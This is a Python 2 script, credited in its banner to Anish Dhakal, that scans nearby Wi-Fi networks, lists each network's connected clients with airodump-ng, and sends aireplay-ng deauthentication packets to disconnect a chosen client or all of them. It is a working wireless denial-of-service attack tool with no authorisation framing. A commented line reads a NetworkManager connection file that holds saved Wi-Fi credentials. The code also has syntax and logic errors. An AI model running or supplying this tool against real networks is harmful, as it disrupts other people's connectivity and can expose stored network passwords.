#!/usr/bin/python
#works only on linux
import os
import time
import re
print "\t\t\tThis Script Was Made By Anish Dhakal\n\n
interface='wlan0'
def selinterface():
	try:
		raw=os.popen('netstat -i | grep "wlan"').read().splitlines()
	except:
		print "No Any Interface Found"
		os._exit(0)
	intfsc=[]
	for i in raw: 
		text=i.split(' ')[0]
		intfsc.append(text)
	def viewintf():
		c=''
		for i in intfsc:
			c=c+i+'\n'
		return c
	x=viewintf()
	raw=x.split('\n')
	lengt=len(raw)
	lengt=lengt-1
	del raw[lengt]
	lengt=len(raw)
	print '\t\tAVAILABLE INTERFACE\n\n'
	for i in range(0,lengt):
		print '\t'+'\t'+'('+str(i+1)+')'+'\t'+raw[i]
		
	print '\t'+'\t'+'('+str(99)+')'+'\t'+'Exit'
	print '\n\n\n \t\tYOU MUST SELECT LISTED INTERFACE NO ANY VALIDATOR USED IN PROGRAM  '
	inp=raw_input(' \t\tSELECT YOUR INTERFACE: ')
	if inp=='Q' or inp=='q':
		os.exit(0)
	pos=int(inp)-1
	interface=raw[pos]
	bsc='ifconfig '+interface+' up'
	os.popen(bsc)
	global interface
	return interface
	#print raw



def devimon():
	interface=selinterface()
	defu='sudo iwlist '+interface+' scanning | grep '
	bscm=defu+'"Address:"'
	bssid=os.popen(bscm).read().splitlines()
	if bssid==' ':
		print 'No Wifi available'
		os.exit(5)
	ids=''
	cells=''
	for i in bssid:
		bssid=i.split(' ')[14]
		cell=i.split(' ')[11]
		ids=ids+bssid+'\n'
		bssid=ids
		cells=cells+cell+'\n'
	escm=defu+'"ESSID:"'
	essid=os.popen(escm).read().splitlines()
	esd=''
	for i in essid:
		essid=i.split('"')[1]
		esd=esd+essid+'\n'
		essid=esd
	chcm=defu+'"Channel:"'
	channel=os.popen(chcm).read().splitlines()
	cha=''
	for i in channel:
		channel=i.split(':')[1]
		cha=cha+channel+'\n'
		channel=cha
	cicm=defu+'"Group Cipher :"'
	cipher=os.popen(cicm).read().splitlines()
	cip=''
	for i in cipher:
		cipher=i.split(' ')[27]
		cip=cip+cipher+'\n'
		cipher=cip
	frcm=defu+'"Frequency:"'
	frequency=os.popen(frcm).read().splitlines()
	frq=''
	for i in frequency:
		nxt=i.split(' ')
		frequency=nxt[20].split(':')[1]
		frq=frq+frequency+'\n'
		frequency=frq
	vl=cells,essid,bssid,channel,frequency
	return vl


def splitor(pos,txt):
	text=txt.split('\n')
	lengt=len(text)
	lengt=lengt-1
	del text[lengt]
	lengt=len(text)
	lengt=lengt-1
	if pos<=lengt:
		return text[pos]

def totwifi(allraw):
	avai=allraw
	txt=avai[0]
	text=txt.split('\n')
	lengt=len(text)
	lengt=lengt-1
	del text[lengt]
	lengt=len(text)
	try:
		lengt=lengt-1
		final=int(text[lengt])
		return final
	except:
		return 50
	
	


def clints(inface,channel,bssid):
	print inface
	print channel
	print bssid
	cwd = os.getcwd()
	path=cwd+'/temp'
	val=os.path.isdir(path)
	if val==True:
		os.chdir(path)
	else:
		os.mkdir(path)
		os.chdir(path)
	ph2=path+'/stations-01.csv'
	val=os.path.isfile(ph2)
	if val==True:
		val=os.listdir(path)
		for i in val:
			os.remove(path+'/'+i)
			
	path='stations'
	print 'Wait For 10sec'
	run1='timeout 20 airodump-ng -c '+channel+' --bssid '+bssid+' -w '+path+' '+inface+' &'
	run2=os.popen(run1).read()
	with open('stations-01.csv','r') as files:
		raw=files.read()
	lengt=len(raw)
	stre=re.search('BSSID, Probed ESSIDs',raw)
	start=stre.end()
	text=raw[start:lengt].splitlines()
	del text[0]
	lengt=len(text)
	lengt=lengt-1
	del text[lengt]
	stations=''
	for i in text:
		strs=i.split(',')[0]
		stations=stations+strs+'\n'
		
	
	return stations
	
def packetsnd(bssid,station,inface,packets,timeout):
	run1='timeout '+timeout+' aireplay-ng -0 '+packets+' -a '+bssid+' -c '+station+' '+inface
	run=os.popen(run1)
	
	
	
def wifilst():
	avai=devimon()
	x=totwifi(avai)
	print '\n\n\n\t'+'SN'+'\t'+'NAME'+'\t\t'+'BSSID'+'\t'+'CHANNEL'+'\t'+'FREQUENCY'
	for i in range(0,x):
		cells=splitor(i,avai[0])
		essid=splitor(i,avai[1])
		bssid=splitor(i,avai[2])
		channel=splitor(i,avai[3])
		frequency=splitor(i,avai[4])
		row='\t'+cells+'\t'+essid+'\t'+bssid+'\t'+channel+'\t'+frequency
		print row
	print '\n\t'+str(99)+'\t'+'Exit'
	print '\n\n\n \t\t You Must Type SN Of Specific Wifi\n'
	datas=raw_input('\t\tSelect Your WiFi To Monitor :')
	if datas=='99' or datas=='99':
		os.exit(0)
	pos=int(datas)-1
	channel2=splitor(pos,avai[3])
	bssid2=splitor(pos,avai[2])
	clin=clints(interface,channel2,bssid2)
	clint=clin.split('\n')
	lengt=len(clint)
	lengt=lengt-1
	del clint[lengt]
	lengt=len(clint)
	lengt=lengt
	clintes=''
	for i in range(0,lengt):
		print '\n\n\t\t\t'+str(i+1)+'\t'+clint[i]
	print '\n\n\t\t\t'+str(99)+'\t'+'Exit'
	print '\t\t\t'+str(50)+'\t'+'All'
	def dis():
		inpu=raw_input('Choose Clint To Disconnect: ')
		if inpu=='99' or inpu=='99':
			os.exit(0)
		if inpu=='50':
			lengt=lengt-1
			print lengt
			for i in range(0,lengt):
				inpu=int(inpu)-1
				cbssid=clint[i]
				packetsnd(bssid,cbssid,interface,'4','20')
			os.exit(5)
		
		
		inpu=int(inpu)-1
		cbssid=clint[inpu]
		#raw=clints(inface,channel,bssid)
		packetsnd(bssid,cbssid,interface,'55','10')
	for i in range(0,lengt):
		dis()
	
try:	
	wifilst()
	coom='ifconfig '+interface+' up'
	runes=os.popen(coom).read()
except:
	coom='ifconfig '+interface+' up'
	runes=os.popen(coom).read()
	runse='timeout 5 airmon-ng start '+interface
#	os.popen(runse)
#splitor(0,avai[2])

#print ("\n"+"\t"+cells+'\t'+essid+"\t"+bssid+"\t"+channel+"\t"+frequency+"\t")

##cat /etc/NetworkManager/system-connections/MERONEPAL
#x=os.('airodump-ng -c 6 --bssid 1C:18:4A:21:8A:30 wlan0').read().splitlines()

#netstat -i
